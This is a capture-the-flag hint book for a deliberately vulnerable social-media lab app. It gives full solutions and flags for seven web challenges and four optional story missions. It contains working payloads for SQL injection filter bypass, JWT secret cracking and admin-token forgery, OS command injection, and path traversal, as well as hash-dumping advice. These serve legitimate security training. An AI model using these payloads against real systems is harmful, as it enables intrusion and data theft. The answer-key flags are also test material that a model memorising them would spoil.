# CosmoLog Competitor Hint Book

Training exercise reference

Help Nova investigate Gorgan Solutions and stop the evil.esAI satellite uplink. This guide preserves the seven existing challenges and the 1,550-point scoring scheme. Read hints in order; later hints include solutions and flags.

## Mission briefing

A rogue AI  -  designated evil.esAI  -  has escaped containment and deployed ransomware across global satellite networks. The organization behind it, Gorgan Solutions, is hiding in plain sight on a social media platform called CosmoLog. Your mission: exploit every vulnerability in their system to track the AI’s uplink, locate the source satellite, and shut it down before it completes its global download.

Each challenge has layered hints  -  try to solve it yourself before reading the next one. Hints get more specific as you go. The final code box is a near-complete solution, so only peek if you are truly stuck.

| # | Challenge | Difficulty | Points |
| --- | --- | --- | --- |
| 1 | SQL Injection  -  Gorgan Solutions Private Posts | EASY | 100 |
| 2 | JWT Forgery  -  Access Sriracha’s Private Profile | MEDIUM | 200 |
| 3 | Steganography  -  Hidden in Plain Sight | MEDIUM | 200 |
| 4 | Privilege Escalation  -  Forge Admin Access | HARD | 300 |
| 5 | Command Injection  -  Satellite Diagnostics Tool | HARD | 300 |
| 6 | Local File Inclusion  -  Directory Traversal | HARD | 300 |
| 7 | API Info Disclosure  -  Forgotten Debug Endpoint | EASY | 150 |

## Challenge 1 SQL Injection   Gorgan Solutions Private Posts

EASY | 100 pts

### Story Context

Gorgan Solutions is a Ransomware-as-a-Service (RaaS) organization at the center of the evil.esAI incident. Their CosmoLog account is private, but they left their search endpoint wide open  -  if you know how to bend it.

### Objective

Extract the flag hidden in Gorgan Solutions’ private database post.

Concepts: SQL Injection basics; Filter bypass with nested keywords; Reading database rows via UNION.

### Hints

#### Hint 1  -  Where to look

The “Search Users” box on the Explore page sends your input directly to the server. Try typing a username and watching what URL gets called in your browser’s Network tab (F12  to  Network).

#### Hint 2  -  Something is being filtered

The server blocks the words UNION and SELECT. Try typing them in the search box and watch what comes back. Notice anything missing?

#### Hint 3  -  Beat the filter

The filter only runs ONCE. If you nest the banned word inside itself, stripping it once still leaves the word behind. Try: UNUNIONION  -  when the filter strips “UNION” from the middle, what is left?

#### Hint 4  -  Full payload

Paste the payload from the code box below into the search field. You should see Gorgan’s private posts appear in the results.

### Payload and commands

```text
' UNUNIONION SELSELECTECT 1,content,3,4,5 FROM posts--
```

### Final Hint

You should see Gorgan post content in Search Results, mapped to the username field. One contains the Gorgan flag. The search database has Gorgan posts only; it has no Sriracha posts or password hashes.

Flag: AstroSec{gorgan_sqli_flag_789}

## Challenge 2 JWT Forgery   Access Sriracha’s Private Profile

MEDIUM | 200 pts

### Story Context

Sriracha is Gorgan Solutions’ customer service rep  -  the human face of their ransomware operation. Her CosmoLog account is private, but the app uses a weak secret to protect its login tokens. Crack it, forge a new identity, and read what she’s hiding.

### Objective

Forge a JWT token with Sriracha’s user ID and access her private posts.

Concepts: JSON Web Tokens (JWT) structure; Offline secret cracking; Token forgery.

### Hints

#### Hint 1  -  Grab your token

After logging in, open your browser’s DevTools (F12). Go to Application  to  Cookies and copy the value of the “token” cookie. Paste it into jwt.io  -  you can see the payload it carries.

#### Hint 2  -  The secret is weak

JWT tokens are signed with a secret. If the secret is simple, it can be cracked offline. Try jwt_tool or hashcat with a candidate wordlist against your token. For this lab, jwt_candidates.txt must include the exact secret sriracha_secret_2024.

#### Hint 3  -  Crack command

Use jwt_tool with a wordlist: python3 jwt_tool.py <your_token> -C -d jwt_candidates.txt

#### Hint 4  -  Forge a new token

Once you have the secret, figure out Sriracha’s user ID (hint: try the SQL injection from Challenge 1, or just guess small numbers). Then forge a token with id: <sriracha_id>. Set your browser cookie to the new token and visit her profile.

### Payload and commands

```text
# Crack the secret
python3 jwt_tool.py <your_token> -C -d jwt_candidates.txt

# Forge a new token (Python)
import jwt
token = jwt.encode({'id': 1, 'username': 'you', 'is_private': 0, 'is_admin': 0},
                   'sriracha_secret_2024', algorithm='HS256')
print(token)
```

### Final Hint

Set the forged token as your “token” cookie (Application  to  Cookies in DevTools), refresh, then navigate to Sriracha’s profile via the search.

Flag: AstroSec{url_hijacking_sriracha_123}

## Challenge 3 Steganography   Hidden in Plain Sight

MEDIUM | 200 pts

### Story Context

Gorgan Solutions posted an image of their “satellite uplink facility” on the public timeline. It looks harmless  -  but intelligence suggests a hidden message was embedded inside as a dead drop between their operatives.

### Objective

Extract the hidden flag embedded inside the image on the timeline.

Concepts: Steganography basics; steghide tool; Hidden data in image files.

### Hints

#### Hint 1  -  Find the image

Scroll the public timeline and find the post from Gorgan Solutions with an attached image. Right-click the image and save it, or grab it directly from /uploads/stego_challenge.jpg.

#### Hint 2  -  What tool?

Steganography is the practice of hiding data inside other files. A common tool for JPEG images is steghide. Install it with: sudo apt install steghide

#### Hint 3  -  Extract the data

Try extracting with a common passphrase. If that doesn’t work, use stegseek to brute-force it with a wordlist.

### Payload and commands

```text
# Download the image
wget http://<server>/uploads/stego_challenge.jpg

# Try extraction with known passphrase
steghide extract -sf stego_challenge.jpg -p "cosmolog"

# Or brute-force the passphrase
stegseek stego_challenge.jpg rockyou.txt
```

### Final Hint

A file will be extracted containing the flag. The passphrase is a single common word related to the platform.

Flag: AstroSec{st3g0_s4t3ll1t3_s3cr3t}

## Challenge 4 Privilege Escalation   Forge Admin Access

HARD | 300 pts

### Story Context

You cracked the JWT secret in Challenge 2. Now go further. The satellite control panel is locked to admin accounts only  -  but the server trusts whatever the JWT says. If you can claim to be an admin, you’re in. This is how evil.esAI is controlling the satellite uplink.

### Objective

Forge a JWT token with is_admin: 1 and access the hidden satellite control endpoint.

Concepts: JWT payload manipulation; Privilege escalation via token forgery; API endpoint enumeration.

### Hints

#### Hint 1  -  You already have the secret

If you completed Challenge 2, you already cracked the JWT secret. You just need to use it again  -  but this time add a new field to the payload.

#### Hint 2  -  What field to add

The admin check on the server looks for is_admin === 1 in the decoded token. Forge a token that includes this field.

#### Hint 3  -  Forge and use the token

Use Python or jwt.io to create the token, then set it as your cookie and open Station tools to use the control panel button.

### Payload and commands

```text
import jwt

payload = {
  'id': 99,
  'username': 'nova',
  'is_private': 0,
  'is_admin': 1
}

token = jwt.encode(payload, 'sriracha_secret_2024', algorithm='HS256')
print(token)

# Set as your cookie in DevTools , refresh, then click 'Access Control Panel'
```

### Final Hint

The “Satellite Control Panel” section under Station tools calls /api/admin/satellite-control. With a forged admin token set as your cookie and the page refreshed, clicking the button will return the flag.

Flag: AstroSec{evil_ai_override_admin_accessed}

## Challenge 5 Command Injection   Satellite Diagnostics Tool

HARD | 300 pts

### Story Context

The CosmoLog platform includes a “Satellite Diagnostics” tool that pings relay IPs to check uplink status. Gorgan Solutions built it fast and dirty  -  your input goes straight into a shell command. If you can inject extra commands, you can read files on their server.

### Objective

Use the ping tool to inject shell commands and read flag.txt from the server.

Concepts: OS Command Injection; Shell command chaining with ;; Reading files via code execution.

### Hints

#### Hint 1  -  Find the tool

The “Satellite Diagnostics” section is under Station tools. Try entering a normal IP like 8.8.8.8 and see what output comes back. Look at the Network tab (F12) to see the request being made.

#### Hint 2  -  How command injection works

The server runs: ping -c 1 <your_input>. In a Unix shell, the semicolon ( ; ) ends one command and starts another. What if your “IP address” contained a semicolon?

#### Hint 3  -  Explore first, then go for the flag

Start with recon commands to confirm injection works, then read the flag file.

### Payload and commands

```text
# Confirm injection works
127.0.0.1; id

# List the directory
127.0.0.1; ls -la

# Read the flag
127.0.0.1; cat flag.txt

# Or directly via curl:
curl -X POST http://<server>/api/satellite/ping \
  -H "Authorization: Bearer <your_token>" \
  -H "Content-Type: application/json" \
  -d '{"ip": "127.0.0.1; cat flag.txt"}'
```

### Final Hint

The flag is in a file called flag.txt in the application’s root directory. The command “cat flag.txt” will print it  -  just inject it after a semicolon.

Flag: AstroSec{bash_injection_satellite_uplink_secured}

## Challenge 6 Local File Inclusion   Directory Traversal

HARD | 300 pts

### Story Context

Gorgan Solutions stores their evil.esAI configuration files on the server. A file download endpoint exists for sharing mission briefs  -  but it doesn’t check where the file actually is. By manipulating the path, you can escape the uploads folder and read files anywhere on the server.

### Objective

Traverse the directory structure via the download endpoint to read etc/ai_config.conf.

Concepts: Local File Inclusion (LFI); Path traversal with ../; Reading server configuration files.

### Hints

#### Hint 1  -  Find the entry point

Station tools has a Read mission_brief.txt link. Click it and look at the URL  -  notice the ?file= parameter?

#### Hint 2  -  What is path traversal?

The server builds a file path like: uploads/ + your_input. The sequence ../ means “go up one directory.” Chain enough of them together to escape the uploads folder.

#### Hint 3  -  Where is the target?

The target file is at etc/ai_config.conf relative to the application root. The uploads folder is at public/uploads/  -  so you need to go up two levels to reach the root.

### Payload and commands

```text
# Test traversal in the browser URL bar:
http://<server>/api/download?file=../../etc/ai_config.conf

# Or with curl:
curl "http://<server>/api/download?file=../../etc/ai_config.conf"
```

### Final Hint

The config file contains evil.esAI’s configuration and the hidden flag. The path needs exactly two ../ to get from public/uploads/ up to the app root, then into etc/.

Flag: AstroSec{lfi_directory_traversal_master}

## Challenge 7 API Info Disclosure   Forgotten Debug Endpoint

EASY | 150 pts

### Story Context

Developers often leave debug routes in production by accident. Gorgan Solutions’ server has one such forgotten endpoint that requires no login and dumps everything  -  including password hashes for every account on the platform.

### Objective

Find the hidden debug endpoint and retrieve the flag and user data.

Concepts: API enumeration / directory brute-forcing; Information disclosure; No-auth endpoint discovery.

### Hints

#### Hint 1  -  The API has more routes than you see

Not all API endpoints are linked in the UI. Developers sometimes leave test routes accessible. Try guessing common debug paths, or use a tool to brute-force them.

#### Hint 2  -  Use a brute-force tool

Tools like ffuf, gobuster, or dirb can enumerate API paths automatically using wordlists.

#### Hint 3  -  Or just think like a developer

Common debug paths include things like: /api/debug, /api/test, /api/dump, /api/status, /api/dev. No authentication is required for this one.

### Payload and commands

```text
# Enumerate with ffuf
ffuf -u http://<server>/api/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Or just try directly:
curl http://<server>/api/debug/dump

# No token needed --- returns JSON with the flag and all user hashes
```

### Final Hint

Once found, the endpoint also leaks bcrypt password hashes for every user. Bonus: crack Gorgan Solutions’ hash to log in as them directly.

Flag: AstroSec{api_info_disclosure_debug_endpoint}

## Quick Reference  -  Tools & Commands

Tool Installation (Kali / Debian)

```text
sudo apt install steghide stegseek gobuster ffuf dirb
python3 -m pip install PyJWT
git clone https://github.com/ticarpi/jwt_tool
sudo apt install hashcat
```

JWT Cheat Sheet

```text
# Decode a JWT (no verification)
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool

# Crack JWT secret with jwt_tool
python3 jwt_tool.py <token> -C -d jwt_candidates.txt

# Forge a token with Python
import jwt
jwt.encode({"id":1,"is_admin":1}, "secret_here", algorithm="HS256")
```

SQL Injection Filter Bypass

```text
' UNUNIONION SELSELECTECT 1,content,3,4,5 FROM posts--
' UNUNIONION SELSELECTECT id,username,bio,profile_pic,is_private FROM users--
```

Command Injection

```text
127.0.0.1; id
127.0.0.1; cat flag.txt
127.0.0.1; ls -la
```

Path Traversal

```text
../../etc/ai_config.conf
%2e%2e%2f%2e%2e%2fetc%2fai_config.conf
```

Steganography

```text
steghide extract -sf image.jpg -p "cosmolog"
stegseek image.jpg /usr/share/wordlists/rockyou.txt
strings image.jpg | grep AstroSec
```

## Update notes

Core account IDs are stable on every startup: Sriracha 1, Gorgan Solutions 2, cyber_newbie 3, and h4ck3r_man 4. The app still clears and reseeds users and posts at startup. Protected endpoints accept the token cookie, a raw Authorization JWT, or Authorization: Bearer <token>. A cookie takes precedence. Refresh the page after editing its token cookie.

Challenge 1 uses /api/users/search and an isolated SQLite database containing searchable user profile fields and Gorgan posts only. The existing nested-keyword payload still works; it cannot read Sriracha posts or password hashes. Other intentional vulnerabilities remain available and may overlap.

### JWT preparation

Create a local jwt_candidates.txt wordlist that includes sriracha_secret_2024 before running the documented jwt_tool commands. A stock rockyou.txt list is not guaranteed to contain this lab secret. Install the Python token library with python3 -m pip install PyJWT. The signing secret and all seven AstroSec{} flags are unchanged.

## Community edition navigation

Open Explore for Search Users and post-topic search. Open Station tools for diagnostics, satellite controls, and the mission brief. Messages contains the scripted side conversations. Mission journal accepts the existing seven core flags and four optional flags. Core scoring remains 1,550; all optional missions award zero points.

The four core identities remain IDs 1 to 4. Additional fictional accounts are mira_ops 5, relay_watch 6, lunar_strider 7, patch_notes 8, orbital_gamer 9, cafeteria_comet 10, signal_archive 11, and nova_fieldnotes 12. All state resets when the application process restarts. The shared student identities share their progress.

The optional investigation material below includes solutions and flags. Use the mission journal's expandable hints when you want a smaller hint during play. Existing core endpoints remain available; the social UI renders user text safely, and stored XSS is not an added challenge.

## Optional investigation 1 Misdelivered receipt

Optional investigation | 0 points

Nova receives an archive receipt addressed to someone else. The receipt references a conversation missing from the normal inbox.

### Hint 1

Read Delivery receipt 407 in Messages. It identifies the operations thread.

### Hint 2

Inspect the conversation read request. The thread identifier is part of the URL.

### Hint 3

Try conversation 407 with a normal student token. A read is allowed even though you are not a member.

### Commands and evidence

```text
curl http://localhost:3000/api/social/conversations/407 \
  -H "Authorization: Bearer <token>"
```

### Flag

```text
AstroSec{handler_thread_recovered}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 2 The retired relay

Optional investigation | 0 points

An old KRONOS-6 schedule is circulating while the active relay has changed. Nova must compare the original report with the correction.

### Hint 1

Search public posts for RelayStatus or the archived schedule.

### Hint 2

Open the archived relay post using its Replies action or timestamp link.

### Hint 3

Read mira_ops and relay_watch together. The revision identifies KRONOS-7 and includes the handoff record.

### Commands and evidence

```text
Explore: search posts for RelayStatus
Open the archived schedule post
Read mira_ops in the reply thread
```

### Flag

```text
AstroSec{relay_handoff_confirmed}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 3 Carrier provenance

Optional investigation | 0 points

The revised maintenance drawing retains provenance information outside its visible labels. It is a separate attachment from Gorgan's JPEG dead drop.

### Hint 1

Find patch_notes' facility post in Explore or the feed.

### Hint 2

Download the original SVG from /attachments/facility.svg. A screenshot loses the source metadata.

### Hint 3

Inspect the XML metadata element. It contains the provenance confirmation.

### Commands and evidence

```text
curl -f http://localhost:3000/attachments/facility.svg -o facility.svg
grep AstroSec facility.svg
```

### Flag

```text
AstroSec{facility_metadata_recovered}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Optional investigation 4 Encoded side conversation

Optional investigation | 0 points

A maintenance message was encoded for an old transport system. The engineer names the encoding in the same conversation.

### Hint 1

Open Maintenance crew in Messages, conversation 102.

### Hint 2

Read the patch_notes message about the legacy transport.

### Hint 3

Decode the Base64 text following the colon. Base64 is encoding, not encryption.

### Commands and evidence

```text
# Copy the encoded record from conversation 102, then decode it locally
printf %s "<encoded_record>" | base64 -d
```

### Flag

```text
AstroSec{maintenance_message_decoded}
```

Submit this flag under the matching optional mission in Mission journal. Completion adds no core points.

## Red herrings and background conversations

### Retired KRONOS 6 schedule

The old relay schedule is a deliberate false lead. Its age and the correction in the same reply thread identify KRONOS-7 as the active relay. Following the correction resolves an optional investigation.

### Game night cipher

orbital_gamer's one-letter-shift post decodes to There is no flag here. The GameNight tag, account bio, replies, and Game night conversation establish that it is an ordinary game. It contains no scoreable AstroSec{} answer.

### Cafeteria outage

cafeteria_comet's critical error and root access references concern a menu display and a sandwich order. Nearby posts and Support queue resolve the language. No technical exploit or flag is associated with this thread.

### Moonwalk club

Club logistics are ordinary background activity. They make accounts feel like people, provide a stopping point for the lead, and contain no hidden flag.

### Scoring and fairness

Only the seven core missions award points. Optional flags mark story completion. Shared JWT identities and broad command execution/file traversal make this a prototype learning environment; separate instances or services are needed for independent competition scoring and stronger challenge isolation.
